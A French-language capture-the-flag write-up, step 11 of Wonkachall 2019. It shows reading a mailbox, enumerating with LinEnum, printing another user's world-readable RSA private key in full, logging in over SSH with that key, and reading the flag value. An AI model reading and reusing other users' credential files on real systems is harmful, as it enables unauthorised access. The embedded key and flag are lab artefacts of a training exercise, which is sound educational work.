# Step 11

## violet's mail

dans la step d'avant en se connectant il était écrit qu'on avait reçu un mail, le voila:

```bash
violet@SRV02-BACKUP:/var/mail$ cat /var/mail/violet
From georgina@srv02-backup Wed Jun 26 12:25:15 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Wed, 26 Jun 2019 12:25:15 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hg574-0004NQ-P1
	for root@srv02-backup; Wed, 26 Jun 2019 12:25:15 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hg574-0004NQ-P1@SRV02-BACKUP>
Date: Wed, 26 Jun 2019 12:25:14 +0200

SRV02-BACKUP : Jun 26 12:25:14 : georgina : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/su


From georgina@srv02-backup Thu Jun 27 10:42:06 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Thu, 27 Jun 2019 10:42:06 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hgPyo-0004cI-66
	for root@srv02-backup; Thu, 27 Jun 2019 10:42:06 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hgPyo-0004cI-66@SRV02-BACKUP>
Date: Thu, 27 Jun 2019 10:42:06 +0200

SRV02-BACKUP : Jun 27 10:42:06 : georgina : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/georgina ; USER=root ; COMMAND=/bin/su


From georgina@srv02-backup Thu Jun 27 10:42:12 2019
Return-path: <georgina@srv02-backup>
Envelope-to: root@srv02-backup
Delivery-date: Thu, 27 Jun 2019 10:42:12 +0200
Received: from georgina by SRV02-BACKUP with local (Exim 4.89)
	(envelope-from <georgina@srv02-backup>)
	id 1hgPyu-0004cO-4W
	for root@srv02-backup; Thu, 27 Jun 2019 10:42:12 +0200
To: root@srv02-backup
Auto-Submitted: auto-generated
Subject: *** SECURITY information for SRV02-BACKUP ***
From:  <georgina@srv02-backup>
Message-Id: <E1hgPyu-0004cO-4W@SRV02-BACKUP>
Date: Thu, 27 Jun 2019 10:42:12 +0200

SRV02-BACKUP : Jun 27 10:42:12 : georgina : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/georgina ; USER=root ; COMMAND=root
```

en fait osef des mails.

## basic enum

donc on lance encore un LinEnum et on voit que la clé rsa de georgina est world readable:

```bash
./LinEnum.sh -s -r report -e /dev/shm -t

[...]
[-] World-readable files within /home:
-rw-r--r-- 1 violet violet 220 juin  21 17:22 /home/violet/.bash_logout
-rw-r--r-- 1 violet violet 675 juin  21 17:22 /home/violet/.profile
-rw-r--r-- 1 violet violet 222 juin  27 11:36 /home/violet/.ssh/known_hosts
-rw-r--r-- 1 violet violet 400 juin  26 18:12 /home/violet/.ssh/authorized_keys
-rw-r--r-- 1 violet violet 3520 juin  27 11:13 /home/violet/.bashrc
-rw-r--r-- 1 georgina georgina 220 juil.  1 17:36 /home/georgina/.bash_logout
-rw-r--r-- 1 georgina georgina 675 juil.  1 17:36 /home/georgina/.profile
-rw-r--r-- 1 georgina georgina 1675 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina
-rw-r--r-- 1 georgina georgina 444 juil.  3 12:00 /home/georgina/.ssh/known_hosts
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/authorized_keys
-rw-r--r-- 1 georgina georgina 399 juin  27 11:20 /home/georgina/.ssh/id_rsa_georgina.pub
-rw-r--r-- 1 georgina georgina 3520 juil.  1 17:32 /home/georgina/.bashrc
[...]
```

## rsa key 

```bash
cat /home/georgina/.ssh/id_rsa_georgina
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA52c0qg1fbh+qRggKuqz8fwC9jsY1qJXg/eG+jl1D1206g3B9
nAu5rf1TiS7FrH8JveMIDgRVJVTVmufHIGzOUPDJU8Gm0W7w3DVd7OPLKW18FEQy
xT0dFzdDbSiz/9xQPXaJmrjV5kTG8rlfALmI8Otd2GLvSIC1rZ2GhJaAgjBPhML3
SbjJXq05LfRGhVNgULIcc9BUPKLAIoEkWQ570iebf3hiYhpyqLIH7nu+H7KpRp16
HRKiaN4g6Y6DxBEssAQLDSe7kc4y8HylfEYeGWoIPj0UroT4zWkLHNaCpZQnNjB1
896BgX837IjCmRmMeYSYdp7INOZakG7ldk/p1QIDAQABAoIBAB4gHYcV/pqDnNNJ
MLxk0Opn2kXAIDQ2bvgeb4RxN+fP3JJIDtJF5IJ2PG3bnPh8AXSrHd1VSxB1Hunv
ysi54ZJABrXUvDb/znOcrwGsFkLqcgDhcAqljif7ldecOPLSZ8/Yosl1zsMPqSbo
Yyng/ab/vVPybVxvBTf5Dg4s2cYY7J7Q9+LSpSR4+qKpdShMWtWM/NkigxEzotmm
xY+YhmYPSncYtGQFBFez95D6eRozK0xLqFu9wX8mnMmtf4EHUoDyrgcJdhU9iGJK
rH8j+y1cf5mw1ikOD1miaQdG+ONLb5BQ2Za+1qHevPUH8xGAnFx/7H/sxmAu81+2
IhfWfwECgYEA+A+nXBjqftnfaVl5X/Bv+6unuYaaQHxxc4mEzC2OObNk9wL0VziW
c9KlyIYun1pgnXDKCc9HutsD6+YJpc5jhI6cK7sy4LpMqZ79vzzK0vmH3Paj8MhO
89OaMJIk584MNvbCf4lbMfsnvjUYV24MT0x+T4kfvFKYO6inq4FRNWUCgYEA7s8T
APkKiqKf/c7WHtFVE7HjTvCXSUmnJ/QIAoaIXBYwNDJ9N8mUES1phjCr32F07T8d
HE8Mozx59DHlzoV++8aEG4SepdUd/ftZut3kXD831WaMyGNiS1DjiXp9wHW0vV4F
m+8e7wIo8YCQOHoIn1FhtYyaV3eRlaTh77ntk7ECgYB3e5rCSqIQrcLlzJog8wAN
ehYUz9fWvdorq46ShlLeSiGUtRCaPoCBk3IVD0S/rtmgnCZE6VmEkF/oLWpyOeJH
hCWHDuknw7SPcyyIA7EyQ80ESqyWmvUkjsTTJmGuYdoSU3NF2RRbE72F6a8q1bAK
Ni8VAliN7j6zZb41ZtmF3QKBgEBsfKP2i3F7Dc5azkjiECGQC9Jv9WBADmgo3UBR
Ktgs5DQwqrcyGk/IAH/DAZrxn6mhLSlF6hLfbccC7wwX13n0xA7oaCQ0qjKqbDqN
Qd3g8B8R20j0BsBqwfeEpAgXuPqdMsYubBnuaz07gay6vzi7q7BejgSqrQvBv3H8
pqsBAoGADf/iIdk7NzkYQZetRfaPX4q9fvuMAz5qtMpiLZ+Hgs4IXSsDilQDqlJU
tYwxziaLeonU2X9D92WNBW9Bm5N0flfD58bUcM+0FbpLOnB9AQ6TDQ0xqIz7YoQy
+IsrauZF5YEKg+UPerckYqW9pC9PpqI/aw++9nBeHNiT6YP6QQQ=
-----END RSA PRIVATE KEY-----
```

## connection as georgina

```bash
ssh -i /home/maki/Documents/wonkachall2019/step11/id_rsa georgina@172.16.69.65
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul  8 11:04:07 2019 from 10.9.0.10
georgina@SRV02-BACKUP:~$ 
```

## flag

```bash
georgina@SRV02-BACKUP:~$ cat flag-11.txt 
5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
```
